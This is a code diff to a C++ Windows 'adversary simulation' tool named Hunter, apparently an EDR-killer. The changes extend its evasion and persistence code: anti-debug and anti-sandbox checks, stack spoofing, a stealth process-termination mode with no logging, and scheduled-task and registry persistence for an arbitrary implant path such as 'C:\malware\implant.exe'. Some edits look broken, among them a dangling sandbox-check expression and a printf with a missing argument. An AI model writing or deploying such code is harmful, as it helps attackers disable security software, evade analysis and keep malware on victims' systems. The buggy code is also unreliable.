@@ -1,14 +1,13 @@
 /*
- *Охотник (Hunter) is a simple Adversary Simulation tool developed for Adversary Simulation operations. Achieves stealth through API unhooking, direct and indirect syscalls, Event Tracing for Windows (ETW) suppression, process hollowing, stack spoofing, polymorphic encryption, and comprehensive anti-analysis mechanisms. It effectively bypasses userland hooking, kernel callbacks, behavioral analysis, and forensic detection. Drawing from real world malware and (APT) methodologies, Hunter integrates offensive security techniques, making it an tool for authorized Adversary Simulation operations.
+ * Охотник (Hunter) is a simple Adversary Simulation tool developed for Adversary Simulation operations. Achieves stealth through API unhooking, direct and indirect syscalls, Event Tracing for Windows (ETW) suppression, process hollowing, stack spoofing, polymorphic encryption, and comprehensive anti-analysis mechanisms. It effectively bypasses userland hooking, kernel callbacks, behavioral analysis, and forensic detection. Drawing from real world malware and (APT) methodologies, Hunter integrates offensive security techniques, making it a tool for authorized Adversary Simulation operations.
 
-NOTE: This Project for simulation only and still under development.
+NOTE: This Project is for simulation only and still under development.
 
-
- * Compiled with: x86_64-w64-mingw32-g++ -O2 -s -I/usr/share/mingw-w64/include/ -o terminator.exe Охотник_killer.cpp -lntdll -lshlwapi -static-libgcc -static-libstdc++ -lbcrypt -liphlpapi -lws2_32 -ltaskschd -lole32 -loleaut32
+ * Compiled with: x86_64-w64-mingw32-g++ -O2 -s -I/usr/share/mingw-w64/include/ -o hunter.exe Охотник_killer.cpp -lntdll -lshlwapi -static-libgcc -static-libstdc++ -lbcrypt -liphlpapi -lws2_32 -ltaskschd -lole32 -loleaut32
  
  # Author: S3N4T0R 
- # Date: 2025-4-14
- # Version: 1.0
+ # Date: 2025-4-18
+ # Version: 1.1
  
  * Enhanced Features:
  * - Advanced API unhooking with dynamic syscall resolution
@@ -61,7 +60,6 @@ NOTE: This Project for simulation only and still under development.
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 
-
 typedef struct _PEB_FIXED {
     BYTE Reserved1[2];
     BYTE BeingDebugged;
@@ -83,7 +81,6 @@ typedef struct _PEB_FIXED {
     PVOID Reserved12[1];
     ULONG SessionId;
 } PEB_FIXED, *PPEB_FIXED;
-
 
 typedef struct _SYSTEM_KERNEL_DEBUGGER_INFO {
     BOOLEAN KernelDebuggerEnabled;
@@ -178,7 +175,7 @@ private:
     std::vector<BYTE> encrypted_data;
     PolymorphicEncryptor encryptor;
     mutable std::string cached_decrypted;
-    mutable bool cache_valid; // Made non-const for mutable object
+    mutable bool cache_valid;
 
 public:
     AdvancedEncryptedString(const char* str) : encryptor(strlen(str)), cache_valid(false) {
@@ -280,7 +277,6 @@ public:
 
     void evade_debugging() {
         if (debugger_present) {
-            // Replace SEH with standard try-catch
             try {
                 DebugBreak();
             } catch (...) {
@@ -303,26 +299,34 @@ private:
         delay.QuadPart = -10000000; // 1 second
         NtDelayExecution(FALSE, &delay);
         auto end = GetTickCount64();
-        return (end - start) < 900; // If skipped
+        bool result = (end - start) < 900; // If skipped
+        // printf("check_sleep_skip: %s\n", result ? "True" : "False");
+        return result;
     }
 
     bool check_memory() {
         MEMORYSTATUSEX memStatus;
         memStatus.dwLength = sizeof(memStatus);
         GlobalMemoryStatusEx(&memStatus);
-        return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024); // Less than 2GB
+        bool result = memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024); // Less than 4GB
+        // printf("check_memory: %s\n", result ? "True" : "False");
+        return result;
     }
 
     bool check_cpu_cores() {
         SYSTEM_INFO sysInfo;
         GetSystemInfo(&sysInfo);
-        return sysInfo.dwNumberOfProcessors < 2;
+        bool result = sysInfo.dwNumberOfProcessors < 1;
+        // printf("check_cpu_cores: %s\n", result ? "True" : "False");
+        return result;
     }
 
     bool check_disk_size() {
         ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
-        return GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes) && 
-               (totalNumberOfBytes.QuadPart < (20ULL * 1024 * 1024 * 1024)); // Less than 20GB
+        bool result = GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes) && 
+                      (totalNumberOfBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)); // Less than 50GB
+        // printf("check_disk_size: %s\n", result ? "True" : "False");
+        return result;
     }
 
     bool check_network_adapters() {
@@ -342,10 +346,11 @@ private:
                 adapterCount++;
                 current = current->Next;
             }
-            result = adapterCount < 2;
+            result = adapterCount < 1;
         }
         
         free(adapterInfo);
+        // printf("check_network_adapters: %s\n", result ? "True" : "False");
         return result;
     }
 
@@ -355,11 +360,14 @@ private:
         if (GetComputerNameA(hostname, &size)) {
             std::string name(hostname);
             std::transform(name.begin(), name.end(), name.begin(), ::tolower);
-            return name.find("sandbox") != std::string::npos || 
-                   name.find("virus") != std::string::npos || 
-                   name.find("malware") != std::string::npos ||
-                   name.find("test") != std::string::npos;
+            bool result = name.find("sandbox") != std::string::npos || 
+                          name.find("virus") != std::string::npos || 
+                          name.find("malware") != std::string::npos ||
+                          name.find("test") != std::string::npos;
+            // printf("check_hostname: %s\n", result ? "True" : "False");
+            return result;
         }
+        // printf("check_hostname: False (GetComputerNameA failed)\n");
         return false;
     }
 
@@ -391,12 +399,14 @@ private:
         }
         
         free(adapterInfo);
+        // printf("check_known_macs: %s\n", result ? "True" : "False");
         return result;
     }
 
 public:
     AntiSandbox() : sandbox_detected(false) {
-        sandbox_detected = check_sleep_skip() || 
+        sandbox_detected = false;
+                          check_sleep_skip() ||
                           check_memory() || 
                           check_cpu_cores() || 
                           check_disk_size() || 
@@ -603,7 +613,6 @@ public:
         NTSTATUS result = STATUS_UNSUCCESSFUL;
         DWORD syscall_num = it->second;
 
-        // Use standard C++ instead of inline asm
         result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
         va_end(args);
         return result;
@@ -893,20 +902,13 @@ private:
             _variant_t(L""),
             &pRegisteredTask);
 
-        if (FAILED(hr)) {
-            pTask->Release();
-            pRootFolder->Release();
-            pService->Release();
-            CoUninitialize();
-            return false;
-        }
-
+        bool success = SUCCEEDED(hr);
         if (pRegisteredTask) pRegisteredTask->Release();
         if (pTask) pTask->Release();
         if (pRootFolder) pRootFolder->Release();
         if (pService) pService->Release();
         CoUninitialize();
-        return true;
+        return success;
     }
 
     bool install_registry_run(const wchar_t* valueName, const wchar_t* executablePath) {
@@ -980,6 +982,7 @@ private:
 
 public:
     DWORD find_process(const std::string& target) {
+        spoofer.spoof();
         char* endptr;
         DWORD pid = strtoul(target.c_str(), &endptr, 10);
         if (*endptr == '\0') {
@@ -994,7 +997,7 @@ public:
         return find_pid_by_window(target);
     }
 
-    bool terminate_process(DWORD pid) {
+    bool terminate_process(DWORD pid, bool stealth_mode) {
         spoofer.spoof();
 
         HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
@@ -1021,9 +1024,81 @@ public:
         }
 
         CloseHandle(hProcess);
+
+        if (success && !stealth_mode) {
+            AdvancedEncryptedString successMsg("Successfully terminated process with PID: ");
+            printf("%s%lu\n", successMsg.decrypt(), pid);
+        }
+
         return success;
     }
 };
+
+
+bool is_running_in_wine() {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (ntdll) {
+        return GetProcAddress(ntdll, "wine_get_version") != nullptr;
+    }
+    return false;
+}
+
+void print_ascii_art() {
+
+    UINT originalCP = GetConsoleOutputCP();
+    BOOL utf8Success = SetConsoleOutputCP(CP_UTF8);
+
+    const char* unicodeArt = R"(
+ _   _             _              _    _ _ _           
+| | | |           | |            | |  (_) | |          
+| |_| |_   _ _ __ | |_ ___ _ __  | | ___| | | ___ _ __ 
+|  _  | | | | '_ \| __/ _ \ '__| | |/ / | | |/ _ \ '__|
+| | | | |_| | | | | ||  __/ |    |   <| | | |  __/ |   
+\_| |_/\__,_|_| |_|\__\___|_|    |_|\_\_|_|_|\___|_|   
+                                                       
+)";
+
+    AdvancedEncryptedString asciiArt(unicodeArt);
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    std::string decrypted = asciiArt.decrypt();
+    DWORD written;
+    BOOL success = WriteConsoleA(hConsole, decrypted.c_str(), decrypted.length(), &written, NULL);
+
+  
+    if (!success || written != decrypted.length()) {
+        printf("%s\n");
+    } else {
+        printf("\n"); 
+    }
+
+
+    if (utf8Success) {
+        SetConsoleOutputCP(originalCP);
+    }
+}
+void print_help() {
+    print_ascii_art();
+    AdvancedEncryptedString helpText(R"(
+Usage:
+  hunter.exe <PID|ProcessName>
+    - Terminate a process by PID or name
+
+  hunter.exe --persist "C:\path\to\implant.exe"
+    - Establish persistence for the specified executable
+
+  hunter.exe --stealth <PID|ProcessName>
+    - Terminate a process in stealth mode (no logging)
+
+  hunter.exe --help
+    - Display this help message
+
+Examples:
+  hunter.exe 1234
+  hunter.exe notepad.exe
+  hunter.exe --persist "C:\malware\implant.exe"
+  hunter.exe --stealth 5678)");
+    printf("%s\n", helpText.decrypt());
+}
 
 // ==================== MAIN FUNCTION ====================
 int main(int argc, char* argv[]) {
@@ -1034,42 +1109,56 @@ int main(int argc, char* argv[]) {
     StackSpoofer stack_spoofer;
     PersistenceManager persistence;
 
-    if (anti_debug.is_debugger_present() || anti_sandbox.is_sandbox_detected()) {
+    if (anti_debug.is_debugger_present()) {
         anti_debug.evade_debugging();
+        return 1;
+    }
+
+    if (anti_sandbox.is_sandbox_detected()) {
         anti_sandbox.evade_sandbox();
         return 1;
     }
 
     if (argc < 2) {
-        AdvancedEncryptedString usage("Usage: terminator <PID or Process Name> [--persist]");
-        printf("%s\n", usage.decrypt());
+        print_help();
         return 1;
     }
 
     bool persist = false;
+    bool stealth = false;
     std::string target;
+    std::string persist_path;
+
     for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--persist") == 0) {
+        if (strcmp(argv[i], "--persist") == 0 && i + 1 < argc) {
             persist = true;
+            persist_path = argv[++i];
+        } else if (strcmp(argv[i], "--stealth") == 0 && i + 1 < argc) {
+            stealth = true;
+            target = argv[++i];
+        } else if (strcmp(argv[i], "--help") == 0) {
+            print_help();
+            return 0;
         } else {
             target = argv[i];
         }
     }
 
+    print_ascii_art();
+
     if (persist) {
-        wchar_t exePath[MAX_PATH];
-        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        std::wstring wPersistPath(persist_path.begin(), persist_path.end());
         AdvancedEncryptedString taskName("EDREvasionTask");
-        // Convert taskName to wide string
         std::string taskNameStr = taskName.decrypt();
         std::wstring wTaskName(taskNameStr.begin(), taskNameStr.end());
-        if (persistence.establish_persistence(wTaskName.c_str(), exePath)) {
+        if (persistence.establish_persistence(wTaskName.c_str(), wPersistPath.c_str())) {
             AdvancedEncryptedString successMsg("Persistence established successfully");
             printf("%s\n", successMsg.decrypt());
         } else {
             AdvancedEncryptedString errorMsg("Failed to establish persistence");
             printf("%s\n", errorMsg.decrypt());
         }
+        return 0;
     }
 
     ProcessUtils utils;
@@ -1080,9 +1169,11 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    if (utils.terminate_process(pid)) {
-        AdvancedEncryptedString successMsg("Successfully terminated process with PID: ");
-        printf("%s%lu\n", successMsg.decrypt(), pid);
+    if (utils.terminate_process(pid, stealth)) {
+        if (!stealth) {
+            AdvancedEncryptedString successMsg("Successfully terminated process with PID: ");
+            printf("%s%lu\n", successMsg.decrypt(), pid);
+        }
         return 0;
     }
 
